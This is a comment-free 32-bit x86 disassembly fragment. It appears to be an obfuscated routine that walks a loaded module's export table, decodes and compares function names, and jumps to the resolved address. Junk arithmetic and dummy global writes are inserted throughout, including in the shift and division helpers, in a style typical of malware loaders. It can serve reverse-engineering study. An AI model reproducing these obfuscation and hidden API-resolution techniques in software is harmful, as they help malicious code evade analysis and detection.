  421274:	mov    ecx,DWORD PTR [ebp-0xdc]
  42127a:	and    eax,ecx
  42127c:	add    eax,DWORD PTR [ebp-0x44]
  42127f:	mov    ecx,DWORD PTR [ebp-0xe0]
  421285:	lea    eax,[eax+ecx*1+0x272f]
  42128c:	xor    eax,0x1080c
  421291:	add    eax,DWORD PTR [ebp-0x178]
  421297:	mov    DWORD PTR [ebp-0xe8],eax
  42129d:	mov    DWORD PTR [ebp-0xc],0x5950
  4212a4:	mov    DWORD PTR [ebp-0xf8],0x4964
  4212ae:	mov    DWORD PTR [ebp-0x130],0x3
  4212b8:	mov    DWORD PTR [ebp-0x20],0x2df9
  4212bf:	mov    DWORD PTR [ebp-0x8],0x4524
  4212c6:	mov    DWORD PTR [ebp-0xd4],0x637e
  4212d0:	mov    DWORD PTR [ebp-0x110],0x38c8
  4212da:	mov    DWORD PTR [ebp-0xa4],0x7118
  4212e4:	mov    DWORD PTR [ebp-0xa0],0xaf6
  4212ee:	mov    DWORD PTR [ebp-0x10c],0x3315
  4212f8:	mov    eax,DWORD PTR [ebp-0xf8]
  4212fe:	mov    ecx,DWORD PTR [ebp-0x130]
  421304:	xor    edx,edx
  421306:	div    ecx
  421308:	add    eax,0x454e
  42130d:	mov    ecx,DWORD PTR [ebp-0xc]
  421310:	and    eax,ecx
  421312:	xor    eax,0x5940
  421317:	add    eax,DWORD PTR [ebp+0x8]
  42131a:	mov    ecx,DWORD PTR [ebp-0x110]
  421320:	mov    edx,DWORD PTR [ebp-0xa4]
  421326:	sub    ecx,edx
  421328:	mov    edx,DWORD PTR [ebp-0xd4]
  42132e:	or     ecx,edx
  421330:	mov    edx,DWORD PTR [ebp-0x8]
  421333:	and    ecx,edx
  421335:	mov    edx,DWORD PTR [ebp-0x20]
  421338:	xor    ecx,edx
  42133a:	mov    edx,DWORD PTR [ebp-0x10c]
  421340:	mov    esi,0x180f
  421345:	sub    esi,edx
  421347:	mov    edx,DWORD PTR [ebp-0xa0]
  42134d:	imul   esi,edx
  421350:	xor    esi,0x402b
  421356:	xor    esi,0xfed78c17
  42135c:	mov    edx,DWORD PTR [ebp-0xe8]
  421362:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  421369:	add    ecx,eax
  42136b:	add    esi,ecx
  42136d:	mov    DWORD PTR [ebp-0x38],esi
  421370:	mov    DWORD PTR [ebp-0x4],0x59a8
  421377:	mov    DWORD PTR [ebp-0x30],0x7021
  42137e:	mov    DWORD PTR [ebp-0xf4],0x6210
  421388:	mov    DWORD PTR [ebp-0x58],0x73d5
  42138f:	mov    DWORD PTR [ebp-0x124],0x1e7d
  421399:	mov    DWORD PTR [ebp-0x3c],0x3144
  4213a0:	mov    eax,DWORD PTR [ebp-0x30]
  4213a3:	xor    eax,0x75cb
  4213a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4213ab:	imul   eax,ecx
  4213ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4213b1:	lea    ecx,[ecx+eax*1-0x2123b90]
  4213b8:	mov    eax,DWORD PTR [ebp-0xf4]
  4213be:	and    eax,0x6b34
  4213c3:	and    eax,0x658d
  4213c8:	xor    edx,edx
  4213ca:	push   0x6
  4213cc:	pop    esi
  4213cd:	div    esi
  4213cf:	imul   eax,eax,0x3fb9
  4213d5:	mov    edx,DWORD PTR [ebp-0x3c]
  4213d8:	and    edx,0x58c7
  4213de:	mov    esi,DWORD PTR [ebp-0x124]
  4213e4:	or     edx,esi
  4213e6:	add    edx,0x7a25
  4213ec:	imul   edx,edx,0x28d2
  4213f2:	mov    esi,DWORD PTR [ebp-0x58]
  4213f5:	xor    edx,esi
  4213f7:	xor    edx,0x1856f731
  4213fd:	mov    esi,DWORD PTR [ebp-0xe8]
  421403:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  42140a:	add    eax,ecx
  42140c:	add    edx,eax
  42140e:	mov    DWORD PTR [ebp-0xac],edx
  421414:	mov    DWORD PTR [ebp-0x54],0x1
  42141b:	mov    DWORD PTR [ebp-0x40],0x1ee8
  421422:	mov    DWORD PTR [ebp-0x1c],0x64d8
  421429:	mov    DWORD PTR [ebp-0xf0],0x5a06
  421433:	mov    DWORD PTR [ebp-0x108],0x2eeb
  42143d:	mov    DWORD PTR [ebp-0x104],0x2108
  421447:	mov    eax,DWORD PTR [ebp-0x1c]
  42144a:	xor    edx,edx
  42144c:	push   0x3
  42144e:	pop    ecx
  42144f:	div    ecx
  421451:	mov    ecx,DWORD PTR [ebp-0x40]
  421454:	or     eax,ecx
  421456:	mov    ecx,DWORD PTR [ebp-0x54]
  421459:	xor    edx,edx
  42145b:	div    ecx
  42145d:	imul   eax,eax,0x7d53
  421463:	mov    ecx,DWORD PTR [ebp+0x8]
  421466:	lea    eax,[ecx+eax*1-0x1f534807]
  42146d:	mov    ecx,DWORD PTR [ebp-0xf0]
  421473:	and    ecx,0x4108
  421479:	and    ecx,0x40e7
  42147f:	sub    ecx,0x1a54
  421485:	xor    ecx,0x25ac
  42148b:	mov    edx,DWORD PTR [ebp-0x104]
  421491:	xor    edx,0x6dda
  421497:	mov    esi,DWORD PTR [ebp-0x108]
  42149d:	and    edx,esi
  42149f:	and    edx,0xe0c
  4214a5:	or     edx,0x5b
  4214a8:	mov    esi,DWORD PTR [ebp-0xe8]
  4214ae:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  4214b2:	add    ecx,eax
  4214b4:	lea    eax,[edx+ecx*1-0xc5b]
  4214bb:	mov    DWORD PTR [ebp-0xa8],eax
  4214c1:	and    DWORD PTR [ebp-0x144],0x0
  4214c8:	jmp    0x4214da
  4214cd:	mov    eax,DWORD PTR [ebp-0x144]
  4214d3:	inc    eax
  4214d4:	mov    DWORD PTR [ebp-0x144],eax
  4214da:	mov    eax,DWORD PTR [ebp-0xe8]
  4214e0:	mov    ecx,DWORD PTR [ebp-0x144]
  4214e6:	cmp    ecx,DWORD PTR [eax+0x18]
  4214e9:	je     0x421aa2
  4214ef:	mov    eax,DWORD PTR [ebp-0x144]
  4214f5:	mov    ecx,DWORD PTR [ebp-0x38]
  4214f8:	mov    edx,DWORD PTR [ebp+0x8]
  4214fb:	add    edx,DWORD PTR [ecx+eax*4]
  4214fe:	mov    DWORD PTR [ebp-0x48],edx
  421501:	mov    eax,DWORD PTR [ebp-0x48]
  421504:	mov    DWORD PTR [ebp-0x210],eax
  42150a:	mov    eax,DWORD PTR [ebp+0xc]
  42150d:	mov    DWORD PTR [ebp-0x20c],eax
  421513:	mov    DWORD PTR [ebp-0x1f0],0xba699573
  42151d:	mov    DWORD PTR [ebp-0x1ec],0x9c0a89d8
  421527:	mov    DWORD PTR [ebp-0x1e0],0xba699577
  421531:	mov    DWORD PTR [ebp-0x1dc],0x9c0a89d8
  42153b:	lea    eax,[ebp-0x1e8]
  421541:	mov    DWORD PTR [ebp-0x1f4],eax
  421547:	mov    eax,DWORD PTR [ebp-0x20c]
  42154d:	movzx  eax,WORD PTR [eax+0x20]
  421551:	xor    eax,0xa38b
  421556:	movzx  eax,ax
  421559:	sar    eax,1
  42155b:	mov    ecx,DWORD PTR [ebp-0x20c]
  421561:	movzx  ecx,WORD PTR [ecx+0x20]
  421565:	xor    ecx,0xa38b
  42156b:	movzx  ecx,cx
  42156e:	shl    ecx,0xf
  421571:	or     eax,ecx
  421573:	movzx  eax,ax
  421576:	mov    ecx,DWORD PTR [ebp-0x1f4]
  42157c:	mov    DWORD PTR [ecx],eax
  42157e:	mov    eax,DWORD PTR [ebp-0x1e0]
  421584:	mov    edx,DWORD PTR [ebp-0x1dc]
  42158a:	xor    eax,0xba699573
  42158f:	xor    edx,0x9c0a89d8
  421595:	mov    cl,0x2
  421597:	call   0x41a184
  42159c:	mov    ebx,eax
  42159e:	mov    esi,edx
  4215a0:	mov    eax,DWORD PTR [ebp-0x1e0]
  4215a6:	mov    edx,DWORD PTR [ebp-0x1dc]
  4215ac:	xor    eax,0xba699573
  4215b1:	xor    edx,0x9c0a89d8
  4215b7:	mov    cl,0x3e
  4215b9:	call   0x421cb2
  4215be:	or     ebx,eax
  4215c0:	or     esi,edx
  4215c2:	movzx  eax,bl
  4215c5:	push   eax
  4215c6:	lea    eax,[ebp-0x198]
  4215cc:	push   eax
  4215cd:	call   0x41e0f9
  4215d2:	mov    eax,DWORD PTR [ebp-0x1f0]
  4215d8:	mov    edx,DWORD PTR [ebp-0x1ec]
  4215de:	xor    eax,0xba699573
  4215e3:	xor    edx,0x9c0a89d8
  4215e9:	mov    cl,0x2
  4215eb:	call   0x41a184
  4215f0:	mov    esi,eax
  4215f2:	mov    edi,edx
  4215f4:	mov    eax,DWORD PTR [ebp-0x1f0]
  4215fa:	mov    edx,DWORD PTR [ebp-0x1ec]
  421600:	xor    eax,0xba699573
  421605:	xor    edx,0x9c0a89d8
  42160b:	mov    cl,0x3e
  42160d:	call   0x421cb2
  421612:	or     esi,eax
  421614:	or     edi,edx
  421616:	mov    DWORD PTR [ebp-0x1f8],esi
  42161c:	jmp    0x421671
  421621:	mov    eax,DWORD PTR [ebp-0x1e0]
  421627:	mov    edx,DWORD PTR [ebp-0x1dc]
  42162d:	xor    eax,0xba699573
  421632:	xor    edx,0x9c0a89d8
  421638:	mov    cl,0x2
  42163a:	call   0x41a184
  42163f:	mov    esi,eax
  421641:	mov    edi,edx
  421643:	mov    eax,DWORD PTR [ebp-0x1e0]
  421649:	mov    edx,DWORD PTR [ebp-0x1dc]
  42164f:	xor    eax,0xba699573
  421654:	xor    edx,0x9c0a89d8
  42165a:	mov    cl,0x3e
  42165c:	call   0x421cb2
  421661:	or     esi,eax
  421663:	or     edi,edx
  421665:	add    esi,DWORD PTR [ebp-0x1f8]
  42166b:	mov    DWORD PTR [ebp-0x1f8],esi
  421671:	mov    eax,DWORD PTR [ebp-0x1e8]
  421677:	cmp    DWORD PTR [ebp-0x1f8],eax
  42167d:	je     0x421710
  421683:	mov    eax,DWORD PTR [ebp-0x1f8]
  421689:	mov    ecx,DWORD PTR [ebp-0x20c]
  42168f:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421694:	xor    eax,0xa38b
  421699:	movzx  eax,ax
  42169c:	sar    eax,1
  42169e:	mov    ecx,DWORD PTR [ebp-0x1f8]
  4216a4:	mov    edx,DWORD PTR [ebp-0x20c]
  4216aa:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  4216af:	xor    ecx,0xa38b
  4216b5:	movzx  ecx,cx
  4216b8:	shl    ecx,0xf
  4216bb:	or     eax,ecx
  4216bd:	movzx  eax,ax
  4216c0:	mov    DWORD PTR [ebp-0x1fc],eax
  4216c6:	mov    eax,DWORD PTR [ebp-0x1f8]
  4216cc:	mov    ecx,DWORD PTR [ebp-0x20c]
  4216d2:	movzx  eax,WORD PTR [ecx+eax*4]
  4216d6:	xor    eax,0xa38b
  4216db:	movzx  eax,ax
  4216de:	sar    eax,1
  4216e0:	mov    ecx,DWORD PTR [ebp-0x1f8]
  4216e6:	mov    edx,DWORD PTR [ebp-0x20c]
  4216ec:	movzx  ecx,WORD PTR [edx+ecx*4]
  4216f0:	xor    ecx,0xa38b
  4216f6:	movzx  ecx,cx
  4216f9:	shl    ecx,0xf
  4216fc:	or     eax,ecx
  4216fe:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421704:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  42170b:	jmp    0x421621
  421710:	mov    eax,DWORD PTR [ebp-0x1f0]
  421716:	mov    edx,DWORD PTR [ebp-0x1ec]
  42171c:	xor    eax,0xba699573
  421721:	xor    edx,0x9c0a89d8
  421727:	mov    cl,0x2
  421729:	call   0x41a184
  42172e:	mov    esi,eax
  421730:	mov    edi,edx
  421732:	mov    eax,DWORD PTR [ebp-0x1f0]
  421738:	mov    edx,DWORD PTR [ebp-0x1ec]
  42173e:	xor    eax,0xba699573
  421743:	xor    edx,0x9c0a89d8
  421749:	mov    cl,0x3e
  42174b:	call   0x421cb2
  421750:	or     esi,eax
  421752:	or     edi,edx
  421754:	mov    DWORD PTR [ebp-0x1e4],esi
  42175a:	mov    eax,DWORD PTR [ebp-0x1e0]
  421760:	mov    edx,DWORD PTR [ebp-0x1dc]
  421766:	xor    eax,0xba699573
  42176b:	xor    edx,0x9c0a89d8
  421771:	mov    cl,0x2
  421773:	call   0x41a184
  421778:	mov    esi,eax
  42177a:	mov    edi,edx
  42177c:	mov    eax,DWORD PTR [ebp-0x1e0]
  421782:	mov    edx,DWORD PTR [ebp-0x1dc]
  421788:	xor    eax,0xba699573
  42178d:	xor    edx,0x9c0a89d8
  421793:	mov    cl,0x3e
  421795:	call   0x421cb2
  42179a:	or     esi,eax
  42179c:	or     edi,edx
  42179e:	mov    DWORD PTR [ebp-0x23c],esi
  4217a4:	mov    DWORD PTR [ebp-0x238],edi
  4217aa:	mov    eax,DWORD PTR [ebp-0x23c]
  4217b0:	or     eax,DWORD PTR [ebp-0x238]
  4217b6:	je     0x421a16
  4217bc:	lea    eax,[ebp-0x204]
  4217c2:	mov    DWORD PTR [ebp-0x208],eax
  4217c8:	mov    eax,DWORD PTR [ebp-0x1e4]
  4217ce:	xor    edx,edx
  4217d0:	mov    cl,0x2
  4217d2:	call   0x421cb2
  4217d7:	mov    esi,eax
  4217d9:	mov    edi,edx
  4217db:	mov    eax,DWORD PTR [ebp-0x1e4]
  4217e1:	xor    edx,edx
  4217e3:	mov    cl,0x3e
  4217e5:	call   0x41a184
  4217ea:	or     esi,eax
  4217ec:	or     edi,edx
  4217ee:	xor    esi,0xba699573
  4217f4:	xor    edi,0x9c0a89d8
  4217fa:	mov    eax,DWORD PTR [ebp-0x208]
  421800:	mov    DWORD PTR [eax],esi
  421802:	mov    DWORD PTR [eax+0x4],edi
  421805:	mov    eax,DWORD PTR [ebp-0x1e4]
  42180b:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421813:	mov    eax,DWORD PTR [ebp-0x1e0]
  421819:	mov    edx,DWORD PTR [ebp-0x1dc]
  42181f:	xor    eax,0xba699573
  421824:	xor    edx,0x9c0a89d8
  42182a:	mov    cl,0x2
  42182c:	call   0x41a184
  421831:	mov    ebx,eax
  421833:	mov    edi,edx
  421835:	mov    eax,DWORD PTR [ebp-0x1e0]
  42183b:	mov    edx,DWORD PTR [ebp-0x1dc]
  421841:	xor    eax,0xba699573
  421846:	xor    edx,0x9c0a89d8
  42184c:	mov    cl,0x3e
  42184e:	call   0x421cb2
  421853:	or     ebx,eax
  421855:	or     edi,edx
  421857:	movsx  eax,bl
  42185a:	cmp    esi,eax
  42185c:	je     0x4219bc
  421862:	mov    eax,DWORD PTR [ebp-0x1e4]
  421868:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421870:	mov    eax,DWORD PTR [ebp-0x204]
  421876:	mov    edx,DWORD PTR [ebp-0x200]
  42187c:	xor    eax,0xba699573
  421881:	xor    edx,0x9c0a89d8
  421887:	mov    cl,0x2
  421889:	call   0x41a184
  42188e:	mov    edi,eax
  421890:	mov    ebx,edx
  421892:	mov    eax,DWORD PTR [ebp-0x204]
  421898:	mov    edx,DWORD PTR [ebp-0x200]
  42189e:	xor    eax,0xba699573
  4218a3:	xor    edx,0x9c0a89d8
  4218a9:	mov    cl,0x3e
  4218ab:	call   0x421cb2
  4218b0:	or     edi,eax
  4218b2:	or     ebx,edx
  4218b4:	mov    eax,DWORD PTR [ebp-0x210]
  4218ba:	movsx  eax,BYTE PTR [eax+edi*1]
  4218be:	cmp    esi,eax
  4218c0:	je     0x4218d0
  4218c6:	jmp    0x421a16
  4218cb:	jmp    0x4219bc
  4218d0:	mov    eax,DWORD PTR [ebp-0x204]
  4218d6:	mov    edx,DWORD PTR [ebp-0x200]
  4218dc:	xor    eax,0xba699573
  4218e1:	xor    edx,0x9c0a89d8
  4218e7:	mov    cl,0x2
  4218e9:	call   0x41a184
  4218ee:	mov    esi,eax
  4218f0:	mov    edi,edx
  4218f2:	mov    eax,DWORD PTR [ebp-0x204]
  4218f8:	mov    edx,DWORD PTR [ebp-0x200]
  4218fe:	xor    eax,0xba699573
  421903:	xor    edx,0x9c0a89d8
  421909:	mov    cl,0x3e
  42190b:	call   0x421cb2
  421910:	or     esi,eax
  421912:	or     edi,edx
  421914:	mov    eax,DWORD PTR [ebp-0x210]
  42191a:	movsx  esi,BYTE PTR [eax+esi*1]
  42191e:	mov    eax,DWORD PTR [ebp-0x1f0]
  421924:	mov    edx,DWORD PTR [ebp-0x1ec]
  42192a:	xor    eax,0xba699573
  42192f:	xor    edx,0x9c0a89d8
  421935:	mov    cl,0x2
  421937:	call   0x41a184
  42193c:	mov    ebx,eax
  42193e:	mov    edi,edx
  421940:	mov    eax,DWORD PTR [ebp-0x1f0]
  421946:	mov    edx,DWORD PTR [ebp-0x1ec]
  42194c:	xor    eax,0xba699573
  421951:	xor    edx,0x9c0a89d8
  421957:	mov    cl,0x3e
  421959:	call   0x421cb2
  42195e:	or     ebx,eax
  421960:	or     edi,edx
  421962:	movsx  eax,bl
  421965:	cmp    esi,eax
  421967:	jne    0x4219bc
  42196d:	mov    eax,DWORD PTR [ebp-0x1e0]
  421973:	mov    edx,DWORD PTR [ebp-0x1dc]
  421979:	xor    eax,0xba699573
  42197e:	xor    edx,0x9c0a89d8
  421984:	mov    cl,0x2
  421986:	call   0x41a184
  42198b:	mov    esi,eax
  42198d:	mov    edi,edx
  42198f:	mov    eax,DWORD PTR [ebp-0x1e0]
  421995:	mov    edx,DWORD PTR [ebp-0x1dc]
  42199b:	xor    eax,0xba699573
  4219a0:	xor    edx,0x9c0a89d8
  4219a6:	mov    cl,0x3e
  4219a8:	call   0x421cb2
  4219ad:	or     esi,eax
  4219af:	or     edi,edx
  4219b1:	mov    DWORD PTR [ebp-0x214],esi
  4219b7:	jmp    0x421a60
  4219bc:	mov    eax,DWORD PTR [ebp-0x1e0]
  4219c2:	mov    edx,DWORD PTR [ebp-0x1dc]
  4219c8:	xor    eax,0xba699573
  4219cd:	xor    edx,0x9c0a89d8
  4219d3:	mov    cl,0x2
  4219d5:	call   0x41a184
  4219da:	mov    esi,eax
  4219dc:	mov    edi,edx
  4219de:	mov    eax,DWORD PTR [ebp-0x1e0]
  4219e4:	mov    edx,DWORD PTR [ebp-0x1dc]
  4219ea:	xor    eax,0xba699573
  4219ef:	xor    edx,0x9c0a89d8
  4219f5:	mov    cl,0x3e
  4219f7:	call   0x421cb2
  4219fc:	or     esi,eax
  4219fe:	or     edi,edx
  421a00:	add    esi,DWORD PTR [ebp-0x1e4]
  421a06:	mov    DWORD PTR [ebp-0x1e4],esi
  421a0c:	jmp    0x42175a
  421a11:	jmp    0x42175a
  421a16:	mov    eax,DWORD PTR [ebp-0x1f0]
  421a1c:	mov    edx,DWORD PTR [ebp-0x1ec]
  421a22:	xor    eax,0xba699573
  421a27:	xor    edx,0x9c0a89d8
  421a2d:	mov    cl,0x2
  421a2f:	call   0x41a184
  421a34:	mov    esi,eax
  421a36:	mov    edi,edx
  421a38:	mov    eax,DWORD PTR [ebp-0x1f0]
  421a3e:	mov    edx,DWORD PTR [ebp-0x1ec]
  421a44:	xor    eax,0xba699573
  421a49:	xor    edx,0x9c0a89d8
  421a4f:	mov    cl,0x3e
  421a51:	call   0x421cb2
  421a56:	or     esi,eax
  421a58:	or     edi,edx
  421a5a:	mov    DWORD PTR [ebp-0x214],esi
  421a60:	mov    eax,DWORD PTR [ebp-0x214]
  421a66:	mov    DWORD PTR [ebp-0xc8],eax
  421a6c:	cmp    DWORD PTR [ebp-0xc8],0x0
  421a73:	je     0x421a9d
  421a79:	mov    eax,DWORD PTR [ebp-0x144]
  421a7f:	mov    ecx,DWORD PTR [ebp-0xac]
  421a85:	movzx  eax,WORD PTR [ecx+eax*2]
  421a89:	mov    ecx,DWORD PTR [ebp-0xa8]
  421a8f:	mov    eax,DWORD PTR [ecx+eax*4]
  421a92:	mov    DWORD PTR [ebp-0xfc],eax
  421a98:	jmp    0x421aa2
  421a9d:	jmp    0x4214cd
  421aa2:	cmp    DWORD PTR [ebp-0xfc],0x0
  421aa9:	jne    0x421ab6
  421aaf:	xor    eax,eax
  421ab1:	jmp    0x421cab
  421ab6:	mov    eax,DWORD PTR [ebp+0x8]
  421ab9:	add    eax,DWORD PTR [ebp-0xfc]
  421abf:	mov    DWORD PTR [ebp-0xec],eax
  421ac5:	mov    DWORD PTR [ebp-0x74],0x0
  421acc:	cmp    DWORD PTR [ebp-0xb0],0x0
  421ad3:	je     0x421b4f
  421ad9:	cmp    DWORD PTR [ebp-0xb0],0x0
  421ae0:	je     0x421b4f
  421ae6:	mov    eax,DWORD PTR [ebp-0xb0]
  421aec:	shl    eax,0x2
  421aef:	mov    DWORD PTR [ebp-0x74],eax
  421af2:	mov    DWORD PTR [ebp-0x14c],0x0
  421afc:	sub    esp,DWORD PTR [ebp-0x74]
  421aff:	mov    DWORD PTR [ebp-0x14c],esp
  421b05:	mov    DWORD PTR [ebp-0x148],0x0
  421b0f:	mov    eax,DWORD PTR [ebp-0x148]
  421b15:	cmp    eax,DWORD PTR [ebp-0xb0]
  421b1b:	je     0x421b4f
  421b21:	mov    eax,DWORD PTR [ebp-0x148]
  421b27:	mov    ecx,DWORD PTR [ebp-0x14c]
  421b2d:	mov    edx,DWORD PTR [ebp-0x148]
  421b33:	mov    esi,DWORD PTR [ebp+0x14]
  421b36:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  421b3a:	mov    DWORD PTR [ecx+eax*4],edx
  421b3d:	mov    eax,DWORD PTR [ebp-0x148]
  421b43:	inc    eax
  421b44:	mov    DWORD PTR [ebp-0x148],eax
  421b4a:	jmp    0x421b0f
  421b4f:	mov    DWORD PTR [ebp-0x9c],0x0
  421b59:	push   0x421c72
  421b5e:	jmp    DWORD PTR [ebp-0xec]
  421b64:	mov    eax,eax
  421b66:	mov    ecx,esp
  421b68:	ret    0x4
  421b6b:	sub    DWORD PTR ds:0x422972,ecx
  421b71:	push   ebx
  421b72:	mov    eax,ds:0x422a36
  421b77:	mov    eax,DWORD PTR [eax]
  421b79:	add    DWORD PTR ds:0x4228be,eax
  421b7f:	push   esi
  421b80:	inc    eax
  421b81:	mov    eax,DWORD PTR [esp+0x18]
  421b85:	or     eax,eax
  421b87:	mov    DWORD PTR ds:0x422976,0x30f6
  421b91:	jne    0x421be2
  421b97:	mov    ecx,DWORD PTR [esp+0x14]
  421b9b:	xor    DWORD PTR ds:0x4228f6,0x4645
  421ba5:	mov    eax,DWORD PTR [esp+0x10]
  421ba9:	mov    ebx,DWORD PTR ds:0x422992
  421baf:	add    ebx,DWORD PTR ds:0x42299e
  421bb5:	mov    DWORD PTR ds:0x422992,ebx
  421bbb:	xor    edx,edx
  421bbd:	adc    DWORD PTR ds:0x422972,0x7727
  421bc7:	div    ecx
  421bc9:	mov    ebx,eax
  421bcb:	mov    eax,DWORD PTR [esp+0xc]
  421bcf:	mov    DWORD PTR ds:0x4228aa,0xac4
  421bd9:	div    ecx
  421bdb:	mov    edx,ebx
  421bdd:	jmp    0x421c6d
  421be2:	mov    ecx,eax
  421be4:	movzx  eax,WORD PTR ds:0x4228ca
  421beb:	or     eax,DWORD PTR ds:0x4229b2
  421bf1:	mov    ds:0x4228ca,eax
  421bf6:	mov    ebx,DWORD PTR [esp+0x14]
  421bfa:	adc    DWORD PTR ds:0x422922,ecx
  421c00:	mov    edx,DWORD PTR [esp+0x10]
  421c04:	mov    eax,DWORD PTR [esp+0xc]
  421c08:	sbb    DWORD PTR ds:0x42299a,0x1a98
  421c12:	shr    ecx,1
  421c14:	mov    DWORD PTR ds:0x42289e,0x38b9
  421c1e:	rcr    ebx,1
  421c20:	or     DWORD PTR ds:0x42296e,0x13a0
  421c2a:	shr    edx,1
  421c2c:	rcr    eax,1
  421c2e:	or     ecx,ecx
  421c30:	jne    0x421c08
  421c36:	div    ebx
  421c38:	mov    esi,eax
  421c3a:	mul    DWORD PTR [esp+0x18]
  421c3e:	mov    ecx,eax
  421c40:	mov    eax,DWORD PTR [esp+0x14]
  421c44:	mul    esi
  421c46:	add    edx,ecx
  421c48:	jb     0x421c68
  421c4e:	cmp    edx,DWORD PTR [esp+0x10]
  421c52:	ja     0x421c68
  421c58:	jb     0x421c69
  421c5e:	cmp    eax,DWORD PTR [esp+0xc]
  421c62:	jbe    0x421c69
  421c68:	dec    esi
  421c69:	xor    edx,edx
  421c6b:	mov    eax,esi
  421c6d:	pop    esi
  421c6e:	pop    ebx
  421c6f:	ret    0x10
  421c72:	sub    DWORD PTR [ebp+0x10],0x1
  421c76:	mov    DWORD PTR ds:0x4228ce,0x220d
  421c80:	cmp    DWORD PTR [ebp+0x10],0x0
  421c84:	je     0x421c93
  421c8a:	and    edi,DWORD PTR ds:0x4229ca
  421c90:	add    esp,DWORD PTR [ebp-0x74]
  421c93:	mov    edi,DWORD PTR ds:0x422896
  421c99:	mov    DWORD PTR [ebp-0x9c],eax
  421c9f:	mov    eax,DWORD PTR [ebp-0x9c]
  421ca5:	mov    DWORD PTR ds:0x4228ee,edx
  421cab:	pop    edi
  421cac:	pop    esi
  421cad:	pop    ebx
  421cae:	leave  
  421caf:	ret    0x10
  421cb2:	mov    DWORD PTR ds:0x42298e,0x1d18
  421cbc:	cmp    cl,0x40
  421cbf:	jae    0x421d06
  421cc5:	cmp    cl,0x20
  421cc8:	mov    DWORD PTR ds:0x4228d6,0x5a1c
  421cd2:	jae    0x421cde
  421cd8:	shld   edx,eax,cl
  421cdb:	shl    eax,cl
  421cdd:	ret    
  421cde:	and    DWORD PTR ds:0x42293e,0x7607
  421ce8:	mov    edx,eax
  421cea:	sub    DWORD PTR ds:0x4228fa,0x422952
  421cf4:	xor    eax,eax
  421cf6:	and    cl,0x1f
  421cf9:	mov    DWORD PTR ds:0x42295e,0x73ce
  421d03:	shl    edx,cl
  421d05:	ret    
  421d06:	xor    eax,eax
  421d08:	xor    edx,edx
  421d0a:	ret    
